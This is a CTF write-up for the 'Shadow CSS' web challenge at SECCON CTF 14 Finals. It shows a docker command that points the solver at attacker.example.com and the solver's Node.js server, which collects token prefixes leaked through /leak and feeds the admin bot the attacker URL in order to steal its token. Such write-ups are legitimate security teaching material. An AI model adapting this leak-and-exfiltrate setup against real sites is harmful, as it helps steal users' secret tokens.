---
title: "Shadow CSS - SECCON CTF 14 Finals 2026"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "shadow", "css", "web", "seccon-ctf-14-finals"]
summary: "Shadow DOM is not a security boundary, but a fun CTF toy :)"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/shadow-css"
license: "none stated"
ctf:
  name: "SECCON CTF 14 Finals"
  year: 2026
  challenge: "Shadow CSS"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/shadow-css>
- **CTF:** SECCON CTF 14 Finals 2026

---

# [web] Shadow CSS

## Description

Shadow DOM is not a security boundary, but a fun CTF toy :)

- Challenge: `http://shadow-css.{int,dom}.seccon.games:3000`
- Admin bot: `http://shadow-css.{int,dom}.seccon.games:1337`

## Attachments

- [shadow-css](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/shadow-css/solution/index.js>

```javascript
import fastify from "fastify";
import fs from "node:fs/promises";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

let known = "TOKEN_";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const verify = (token) =>
  fetch(`${BOT_BASE_URL}/api/verify`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ token }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  reply.type("text/html; charset=utf-8").send(await fs.readFile("index.html"));
});

app.get("/leak", async (req, reply) => {
  known = req.query.prefix;
  console.log({ known });
  return "";
});

app.get("/known", async (req, reply) => {
  const length = parseInt(req.query.length);
  while (true) {
    if (known.length >= length) {
      return known;
    } else {
      await sleep(10);
    }
  }
});

app.post("/token", async (req, reply) => {
  const token = req.body;
  const flag = await verify(token);
  console.log({ token, flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);
  await reportUrl(CONNECTBACK_URL);
  assert.fail("Failed");
});
```
